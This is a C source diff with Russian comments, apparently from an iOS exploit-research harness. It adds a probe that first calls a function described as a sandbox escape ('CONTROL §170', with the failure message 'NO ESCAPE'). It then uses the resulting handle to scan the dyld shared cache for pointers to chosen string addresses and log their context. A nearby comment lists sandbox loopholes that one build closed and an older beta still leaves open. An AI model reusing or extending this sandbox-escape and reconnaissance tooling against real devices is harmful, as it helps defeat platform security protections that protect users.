@@ -48295,6 +48295,115 @@ static void p_bq117(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq118 — v277: кто ссылается на fc_has_gamma_luts (0x1847dfd2c)?
+// Строка в QC __TEXT, но ни QC __TEXT (adrp), ни QC data-сегменты (PTR) её не
+// адресуют → указатель живёт в data-сегменте ДРУГОГО образа (dsc хранит
+// абсолютные указатели). Скан: все сабфайлы на u64-паттерны + контекст ±192.
+static void p_bq118(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq118] v277: поиск ссылателя fc-строк (§268)");
+    fsync(fileno(stderr));
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq118] CONTROL §170 -> handle %lld%s", (long long)h,
+        h < 0 ? " *** NO ESCAPE ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) return;
+
+    const char *candirs[] = {
+        "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld",
+        "/System/Library/Caches/com.apple.dyld",
+        "/System/Library/dyld",
+        "/private/var/db/dyld",
+    };
+    char cdir[1024] = {0};
+    for (unsigned i = 0; i < sizeof(candirs)/sizeof(candirs[0]) && !cdir[0]; i++) {
+        DIR *pd = opendir(candirs[i]);
+        if (!pd) continue;
+        struct dirent *pe;
+        while ((pe = readdir(pd)))
+            if (strstr(pe->d_name, "dyld_shared_cache_arm64e")) {
+                snprintf(cdir, sizeof(cdir), "%s", candirs[i]); break;
+            }
+        closedir(pd);
+    }
+    if (!cdir[0]) { LOG("[bq118] кэш-каталог не найден"); bad_query_release(h); return; }
+
+    // цели: fc_has_gamma_luts (0x1847dfd2c), gamma_luts (0x1847dfd33),
+    // fc_attachment_count (найдём из карва: base+0x42d?? — зададим точно)
+    static const uint64_t targets[] = {
+        0x1847dfd2cULL,  // fc_has_gamma_luts
+        0x1847dfd33ULL,  // gamma_luts
+    };
+    static const char *tnames[] = { "fc_has_gamma_luts", "gamma_luts" };
+
+    DIR *cd = opendir(cdir);
+    struct dirent *ce;
+    int n_hits = 0;
+    while (cd && (ce = readdir(cd)) && n_hits < 40) {
+        if (ce->d_name[0] == '.') continue;
+        if (strstr(ce->d_name, ".symbols")) continue;
+        if (!strstr(ce->d_name, "dyld_shared_cache")) continue;
+        char fp[1400];
+        snprintf(fp, sizeof(fp), "%s/%s", cdir, ce->d_name);
+        int sfd = open(fp, O_RDONLY);
+        if (sfd < 0) continue;
+        struct stat st = {0};
+        if (fstat(sfd, &st) != 0 || st.st_size < 8192) { close(sfd); continue; }
+        void *m = mmap(NULL, (size_t)st.st_size, PROT_READ, MAP_FILE | MAP_PRIVATE, sfd, 0);
+        if (m == MAP_FAILED) { close(sfd); continue; }
+        // маппинги этого сабфайла — для вычисления VM хита
+        struct bq14_cache_header sh = {0};
+        pread(sfd, &sh, sizeof(sh), 0);
+        struct bq14_mapping_info mm[64];
+        memset(mm, 0, sizeof(mm));
+        BOOL have_maps = (memcmp(sh.magic, "dyld_v1", 7) == 0 &&
+                          sh.mappingCount <= 64 &&
+                          pread(sfd, mm, sh.mappingCount * sizeof(struct bq14_mapping_info),
+                                sh.mappingOffset) ==
+                          (ssize_t)(sh.mappingCount * sizeof(struct bq14_mapping_info)));
+        for (unsigned t = 0; t < sizeof(targets)/sizeof(targets[0]) && n_hits < 40; t++) {
+            uint64_t tv = targets[t];
+            const char *needle = (const char *)&tv;
+            char *p = (char *)m, *end = (char *)m + st.st_size - 8;
+            while (n_hits < 40 && (p = memmem(p, (size_t)(end - p), needle, 8)) != NULL) {
+                uint64_t foff = (uint64_t)(p - (char *)m);
+                uint64_t vm = 0;
+                if (have_maps) {
+                    for (uint32_t k = 0; k < sh.mappingCount; k++) {
+                        if (mm[k].fileOffset <= foff &&
+                            foff < mm[k].fileOffset + mm[k].size) {
+                            vm = mm[k].address + (foff - mm[k].fileOffset);
+                            break;
+                        }
+                    }
+                }
+                LOG("[bq118] %s PTR @%s+0x%llx (VM %s%llx)",
+                    tnames[t], ce->d_name, (unsigned long long)foff,
+                    vm ? "0x" : "?", (unsigned long long)vm);
+                // контекст ±192: читаемые строки вокруг
+                char ctx[420];
+                int cs = (int)(foff > 192 ? foff - 192 : 0);
+                int ce2 = (int)((foff + 200 < (uint64_t)st.st_size) ? foff + 200 : st.st_size);
+                int len = ce2 - cs; if (len > 400) len = 400;
+                memcpy(ctx, (char *)m + cs, (size_t)len); ctx[len] = 0;
+                for (int k = 0; k < len; k++)
+                    if (ctx[k] < 0x20 || (unsigned char)ctx[k] > 0x7e) ctx[k] = '.';
+                LOG("[bq118]   ctx: %s", ctx);
+                fsync(fileno(stderr));
+                n_hits++;
+                p += 8;
+            }
+        }
+        munmap(m, (size_t)st.st_size);
+        close(sfd);
+    }
+    if (cd) closedir(cd);
+    LOG("[bq118] ИТОГ: %d хитов", n_hits);
+    bad_query_release(h);
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -56926,6 +57035,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ115")) { p_bq115(); LOG("[probe13] bq115-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ116")) { p_bq116(); LOG("[probe13] bq116-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ117")) { p_bq117(); LOG("[probe13] bq117-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ118")) { p_bq118(); LOG("[probe13] bq118-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
